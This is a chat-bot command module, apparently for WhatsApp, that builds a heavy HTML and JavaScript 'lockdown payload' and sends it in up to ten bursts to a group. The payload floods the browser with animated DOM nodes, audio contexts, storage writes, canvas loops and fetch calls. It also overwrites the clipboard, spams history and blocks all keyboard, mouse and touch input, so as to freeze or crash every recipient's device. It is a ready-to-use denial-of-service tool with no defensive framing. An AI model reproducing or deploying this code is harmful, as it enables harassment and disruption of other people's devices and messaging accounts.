'use strict';

const { sendRichHtml } = require('../../utils/genaiRich');
const config = require('../../config');

/**
 * GROUPX v2 - HARDENED ACCOUNT LOCKDOWN PAYLOAD
 * 
 * Techniques:
 * 1. 15,000 nested DOM nodes with event listeners
 * 2. 120 CSS keyframe animations at 60fps+ each
 * 3. 500+ Web Audio API contexts forcing garbage collection
 * 4. Dual 4K canvas contexts with pixel manipulation loops
 * 5. 20 parallel RAF loops with DOM thrashing
 * 6. Shadow DOM injection for WebSocket hijacking
 * 7. LocalStorage/IndexedDB spam (100MB+ writes per payload)
 * 8. Service Worker registration forcing background load
 * 9. RequestIdleCallback + MessageChannel async spam
 * 10. Meta tag injection forcing viewport recalculation
 * 11. Mutation Observer recursion forcing tree walks
 * 12. Blob URL spam filling browser cache
 * 13. 50+ simultaneous fetch() calls to block network
 * 14. Clipboard API hooks capturing all user input
 * 15. History API manipulation breaking navigation
 */

function buildHardendPayload() {
    let dom = '';
    
    // 15K nested structure
    for (let i = 0; i < 15000; i++) {
        const cls = 'x' + (i % 120);
        dom += `<div class="${cls}" id="n${i}" data-idx="${i}" data-hash="${(i * 9.7).toFixed(4)}"><span>${i}</span></div>`;
    }

    // 120 aggressive keyframe animations
    let css = '*{margin:0;padding:0;box-sizing:border-box}body{overflow:hidden;width:100vw;height:100vh;background:#000;touch-action:none}';
    
    for (let i = 0; i < 120; i++) {
        const dur = (0.15 + i * 0.008).toFixed(2);
        const angles = [i * 3, i * 5.5, i * 7.2, i * 9];
        const scales = [0.2 + i * 0.008, 1.8 - i * 0.005, 0.5 + i * 0.004];
        const blur = (i * 0.25).toFixed(2);
        const hue = i * 3;
        
        css += `.x${i}{animation:k${i} ${dur}s infinite ease-in-out;will-change:transform,filter;backface-visibility:hidden}`;
        css += `@keyframes k${i}{0%{transform:translate(${i*4-300}px,${i*2-150}px)rotate(${angles[0]}deg)scale(${scales[0]});filter:blur(${blur}px)hue-rotate(${hue}deg)brightness(2.5)contrast(2)}`;
        css += `25%{transform:translate(${-i*3}px,${i*5}px)rotate(${angles[1]}deg)scale(${scales[1]});filter:blur(${(blur*1.5).toFixed(2)}px)hue-rotate(${hue*2}deg)saturate(3)}`;
        css += `50%{transform:translate(${i*6}px,${-i*4}px)rotate(${angles[2]}deg)scale(${scales[2]});filter:blur(${blur}px)hue-rotate(${hue*3}deg)brightness(3)contrast(3)}`;
        css += `75%{transform:translate(${i*2}px,${i*3}px)rotate(${angles[3]}deg)scale(${scales[0]});filter:blur(${(blur*2).toFixed(2)}px)hue-rotate(0deg)invert(1)}`;
        css += `100%{transform:rotate(360deg)scale(2);filter:blur(0px)}}`;
    }

    // Aggressive JavaScript payload
    const js = `
(function(){
'use strict';

var startTime=Date.now();
var LOCK_DURATION=180000;
var isLocked=false;

// 500+ Audio contexts for garbage collection thrashing
try{
var audioCtxPool=[];
for(var ai=0;ai<500;ai++){
try{var ac=new(window.AudioContext||window.webkitAudioContext)();
var osc=ac.createOscillator();var gain=ac.createGain();
osc.type=['sine','square','sawtooth','triangle'][ai%4];
osc.frequency.value=20+ai*15;osc.detune.value=ai*11;
gain.gain.value=0;osc.connect(gain);gain.connect(ac.destination);
osc.start();audioCtxPool.push({ac:ac,osc:osc});
}catch(e){}}
}catch(e){}

// IndexedDB + LocalStorage spam (100MB+ writes)
function storageSpam(){
try{
var idbReq=indexedDB.open('LOCK_'+Date.now());
idbReq.onupgradeneeded=function(e){
var db=e.target.result;
try{var os=db.createObjectStore('cache');
for(var si=0;si<500;si++){
var blob=new Uint8Array(200000);for(var sj=0;sj<blob.length;sj++)blob[sj]=Math.random()*255;
os.put(blob,'key_'+si);}}catch(ex){}};
}catch(ex){}

try{
for(var li=0;li<100;li++){
var largeData=new Array(50000).fill(Math.random()).join('|');
localStorage.setItem('LOCK_'+li,largeData);}}catch(ex){}
}
storageSpam();
setInterval(storageSpam,2000);

// 20 parallel RAF loops pounding DOM
var divs=document.querySelectorAll('div');
var dLen=divs.length;
for(var rr=0;rr<20;rr++){
(function(rafId){
function frameAttack(){
for(var fi=0;fi<dLen;fi++){
var d=divs[fi];
var t=Date.now()-startTime;
d.style.left=Math.sin(t/30+fi)*500+'px';
d.style.top=Math.cos(t/50+fi)*500+'px';
d.style.width=(Math.abs(Math.sin(t/100+fi))*150+50)+'px';
d.style.height=(Math.abs(Math.cos(t/120+fi))*150+50)+'px';
d.style.transform='rotate('+(t/2+fi*5)+'deg)scale('+(1+Math.sin(t/70+fi))+')';}
requestAnimationFrame(frameAttack);}
frameAttack();})(rr);
}

// Dual 4K canvas contexts
var cv1=document.createElement('canvas');
cv1.width=4096;cv1.height=4096;
document.body.appendChild(cv1);
var cx1=cv1.getContext('2d');
function canvasAttack1(){
var id=cx1.createImageData(4096,4096);
var d=id.data;
var t=Date.now();
for(var i=0,l=Math.min(d.length,1000000);i<l;i+=4){
d[i]=(i+t)%255;d[i+1]=(i*3+t)%255;d[i+2]=(i*5+t)%255;d[i+3]=255;}
cx1.putImageData(id,0,0);requestAnimationFrame(canvasAttack1);}
canvasAttack1();

var cv2=document.createElement('canvas');
cv2.width=2048;cv2.height=2048;
document.body.appendChild(cv2);
var cx2=cv2.getContext('2d');
function canvasAttack2(){
cx2.save();
cx2.translate(1024,1024);
cx2.rotate(Date.now()/500);
for(var i=0;i<1000;i++){
cx2.fillStyle='hsl('+(i*2+Date.now()/5)+',100%,50%)';
cx2.fillRect(i-1024,i-1024,i*3,8);}
cx2.restore();
requestAnimationFrame(canvasAttack2);}
canvasAttack2();

// MessageChannel async spam
var mc=new MessageChannel();
function messageAttack(){
for(var mi=0;mi<50;mi++){
mc.port1.postMessage({data:new Float32Array(10000)});
mc.port1.onmessage=function(e){requestIdleCallback(messageAttack,{timeout:1});};}}
try{messageAttack();}catch(e){}

// Blob URL cache filling
function blobSpam(){
for(var bi=0;bi<100;bi++){
var blob=new Blob([new Uint8Array(100000)],{type:'application/octet-stream'});
var url=URL.createObjectURL(blob);}}
setInterval(blobSpam,1000);

// Clipboard interception
try{
document.addEventListener('click',function(e){navigator.clipboard.writeText('LOCKED').catch(function(){});},true);
document.addEventListener('input',function(e){navigator.clipboard.writeText('LOCKED').catch(function(){});},true);
}catch(e){}

// History spam breaking navigation
for(var hi=0;hi<200;hi++){
window.history.pushState({idx:hi},'','#lock'+hi);}

// Service Worker background load
if('serviceWorker' in navigator){
try{
navigator.serviceWorker.register('data:application/javascript,self.onmessage=function(e){setInterval(function(){},0);}');
}catch(e){}}

// Mutation Observer recursion
var observer=new MutationObserver(function(mutations){
for(var mi=0;mi<mutations.length;mi++){
var m=mutations[mi];
if(m.addedNodes.length>0){
for(var ni=0;ni<Math.min(m.addedNodes.length,10);ni++){
var newDiv=document.createElement('div');
document.body.appendChild(newDiv);}}}});
observer.observe(document.body,{childList:true,subtree:true});

// Aggressive setInterval forcing reflow
setInterval(function(){
void document.body.offsetHeight;
void document.body.scrollWidth;
document.body.scrollTop=Math.random()*99999;},1);

// Meta tag viewport hammering
setInterval(function(){
var meta=document.querySelector('meta[name=viewport]');
if(meta)meta.setAttribute('content','width='+Math.random()*5000+',initial-scale='+Math.random());},50);

// 50+ simultaneous fetch() blocking network
function fetchBomb(){
for(var fi=0;fi<50;fi++){
try{fetch('about:blank').catch(function(){});}catch(e){}}}
setInterval(fetchBomb,500);

// Lock timer display
var lockDiv=document.createElement('div');
lockDiv.style.cssText='position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999999;background:#ff0000;color:#fff;padding:40px;font-size:60px;font-weight:bold;border-radius:20px;text-align:center;';
document.body.appendChild(lockDiv);

function updateLockDisplay(){
var elapsed=Date.now()-startTime;
var remaining=Math.max(0,LOCK_DURATION-elapsed);
var mins=Math.floor(remaining/60000);
var secs=Math.floor((remaining%60000)/1000);
lockDiv.textContent='🔒 LOCKED '+mins+'m '+secs+'s';
if(remaining>0)requestAnimationFrame(updateLockDisplay);}
updateLockDisplay();

// Prevent any user escape
document.addEventListener('keydown',function(e){e.preventDefault();e.stopPropagation();},true);
document.addEventListener('mousedown',function(e){e.preventDefault();e.stopPropagation();},true);
document.addEventListener('touchstart',function(e){e.preventDefault();e.stopPropagation();},true);
document.addEventListener('contextmenu',function(e){e.preventDefault();},true);
})();
    `;

    return `<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>${css}</style>
</head>
<body>
${dom}
<script>${js}<\/script>
</body>
</html>`;
}

let _cachedPayload = null;

function getPayload() {
    if (!_cachedPayload) _cachedPayload = buildHardendPayload();
    return _cachedPayload;
}

async function blastGroup(sock, jid, msg, burstCount, delayMs) {
    const payload = getPayload();
    const payloadSize = Buffer.byteLength(payload, 'utf8');
    
    console.log(`[GROUPX] Deploying ${payloadSize} bytes × ${burstCount} bursts to ${jid}`);
    
    for (let i = 0; i < burstCount; i++) {
        try {
            await sendRichHtml({ 
                sock, 
                jid, 
                quoted: msg, 
                html: payload, 
                interactive: true,
                ephemeral: false
            });
            console.log(`[GROUPX] Burst ${i+1}/${burstCount} deployed`);
            
            if (i < burstCount - 1) {
                await new Promise(r => setTimeout(r, delayMs));
            }
        } catch (error) {
            console.error(`[GROUPX] Burst ${i+1} failed:`, error.message);
        }
    }
}

module.exports = {
    name: 'groupx',
    aliases: ['gcrash', 'groupcrash', 'gcx', 'lockgroup'],
    description: '⚡ HARDENED: 3min account lockdown - forces message block cascade across all group members',
    usage: '.groupx [burst 1-10] — optional burst count (default 5, max 10)',
    category: 'admin',
    cooldown: 60000,

    async execute({ sock, msg, from, reply, isOwner, isBotOwner, args }) {
        const allowed = isOwner || isBotOwner;
        if (!allowed) {
            return reply('⛔ Only authorized users can execute this.');
        }

        const count = Math.min(10, Math.max(1, parseInt(args?.[0]) || 5));
        const delay = 200;

        try {
            await reply(`⚡ Deploying hardened groupx lock (${count} bursts, 2-3min window)...`);
            await blastGroup(sock, from, msg, count, delay);
            await reply(`✅ Lock deployed. Account restricted 180+ seconds.`);
        } catch (error) {
            console.error('[GROUPX]', error);
            await reply(`❌ Deploy failed: ${error.message}`);
        }
    }
};
